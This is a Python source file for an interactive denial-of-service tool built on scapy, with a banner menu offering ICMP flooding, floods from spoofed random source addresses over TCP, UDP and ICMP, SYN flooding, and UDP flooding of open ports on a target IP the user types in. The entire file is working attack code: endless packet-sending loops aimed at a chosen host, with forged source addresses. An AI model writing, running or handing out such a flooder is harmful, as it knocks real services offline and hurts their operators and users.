from sys import flags
from scapy.all import *
from os import system , name as OSname
from colorama import Fore as color
from random import randint
import socket
from contextlib import closing
def randomColorF():
    num=randint(0,4)
    if num == 0:
        return color.LIGHTCYAN_EX
    elif num == 1 :
        return color.LIGHTGREEN_EX
    elif num == 2 :
        return color.LIGHTBLUE_EX
    else :
        return color.LIGHTYELLOW_EX
def DDOSmainF():
    system("clear")
    while 1:
        print(f"""{randomColorF()}
        ██████╗ ██████╗  ██████╗ ███████╗
        ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
        ██║  ██║██║  ██║██║   ██║███████╗
        ██║  ██║██║  ██║██║   ██║╚════██║
        ██████╔╝██████╔╝╚██████╔╝███████║
        ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                        
            1. ICMP attack

            2. Smurf attack

            3. TCP state existing

            4. UDP flooding

            5. Exit

        """)
        try:
            selection=input(f"{randomColorF()}[DDoS]~> ")
            if selection=="1":
                Dst=input("\n\nEnter the packet destination IP : ")
                Src=input("\n\nEnter the packet source IP : ")
                print("\n\nEnter ^C to exit .\n\n")
                pingr = IP(dst=Dst,src=Src)/ICMP()
                try:
                    while 1:
                        send(pingr)
                except KeyboardInterrupt:
                    pass
            elif selection=="2":
                print(f"\n{system("clear")}\n{randomColorF()}1. TCP\n2. UDP\n3. ICMP\n\n")
                selection2=input(f"{randomColorF()}[DDoS]~> ")
                Dst=input("\n\nEnter the packet destination IP : ")
                if selection2=="1" or selection2=="2":
                    while 1:
                        try:
                            Dport=int(input("\n\nEnter the packet destination port : "))
                            break
                        except ValueError:
                            print(f"\n\n{color.LIGHTRED_EX}\nValueError !{randomColorF()}")
                if selection2=="1":
                    print("\n\nEnter ^C to exit .\n\n")
                    try:
                        while 1:
                            packet = IP(dst=Dst, src=f"{randint(1,200)}.{randint(1,200)}.{randint(1,200)}.{randint(1,200)}")/TCP(sport=randint(1024 ,49151), dport=Dport)
                            send(packet)
                    except KeyboardInterrupt:
                        pass
                elif selection2=="2":
                    print("\n\nEnter ^C to exit .\n\n")
                    try:
                        while 1:
                            packet = IP(dst=Dst, src=f"{randint(1,200)}.{randint(1,200)}.{randint(1,200)}.{randint(1,200)}")/UDP(sport=randint(4096,65535), dport=Dport)
                            send(packet)
                    except KeyboardInterrupt:
                        pass
                elif selection2=="3":
                    try:
                        while 1:
                            packet = IP(dst=Dst, src=f"{randint(1,200)}.{randint(1,200)}.{randint(1,200)}.{randint(1,200)}")/ICMP()
                            send(packet)
                    except KeyboardInterrupt:
                        pass
            elif selection=="3":
                print(f"{system("clear")}{randomColorF()}1. Normal attack\n\n2. Smurf attack\n\n")
                selection2=input(f"{randomColorF()}[DDoS]~> ")
                Dst=input("\n\nEnter the packet destination IP : ")
                while 1:
                    try:
                        Dport=int(input("\n\nEnter the packet destination port : "))
                        break
                    except ValueError:
                        print(f"\n\n{color.LIGHTRED_EX}\nValueError !{randomColorF()}")
                if selection2=="1":
                    Src=input("\n\nEnter the packet source IP : ")
                    while 1:
                        try:
                            Sport=int(input("\n\nEnter the packet source port : "))
                            break
                        except ValueError:
                            print(f"\n\n{color.LIGHTRED_EX}\nValueError !{randomColorF()}")
                    print("\n\nEnter ^C to exit .\n\n")
                    try:
                        while 1:
                            packet = IP(dst=Dst, src=Src)/TCP(sport=Sport, dport=Dport,flags="S")
                            send(packet)
                    except KeyboardInterrupt:
                        pass
                elif selection2=="2":
                    print("\n\nEnter ^C to exit .\n\n")
                    try:
                        while 1:
                            packet = IP(dst=Dst, src=f"{randint(1,200)}.{randint(1,200)}.{randint(1,200)}.{randint(1,200)}")/TCP(sport=randint(1024 ,49151), dport=Dport,flags="S")
                            send(packet)
                    except KeyboardInterrupt:
                        pass
            elif selection=="4":
                print(f"{system("clear")}{randomColorF()}1. Normal attack\n\n2. Smurf attack\n\n")
                selection2=input(f"{randomColorF()}[DDoS]~> ")
                Dst=input("\n\nEnter the packet destination IP : ")
                if selection2=="1":
                    Src=input("\n\nEnter the packet source IP : ")
                    while 1:
                        try:
                            Sport=int(input("\n\nEnter the packet source port : "))
                            break
                        except ValueError:
                            print(f"\n\n{color.LIGHTRED_EX}\nValueError !{randomColorF()}")
                print("\n\nEnter ^C to exit .\n\n")
                try:
                    for port in range(4096,65535):
                        with closing(socket.socket(socket.AF_INET, socket.SOCK_DGRAM)) as sock:
                            if sock.connect_ex((Dst, port)) == 0:
                                if selection2=="1":
                                    while 1:
                                        packet = IP(dst=Dst, src=Src)/UDP(sport=Sport, dport=port)
                                        send(packet)
                                elif selection2=="2":
                                    while 1:
                                        packet = IP(dst=Dst, src=f"{randint(1,200)}.{randint(1,200)}.{randint(1,200)}.{randint(1,200)}")/UDP(sport=randint(4096,65535), dport=port)
                                        send(packet)
                except KeyboardInterrupt:
                    pass
            elif selection=="5":
                break
        except OSError:
            print(f"\n\n{color.RED}There is a problem with the operation. Please check the entered values and try again.\n Please ENTER to continue{randomColorF()}\n\n")
            input()
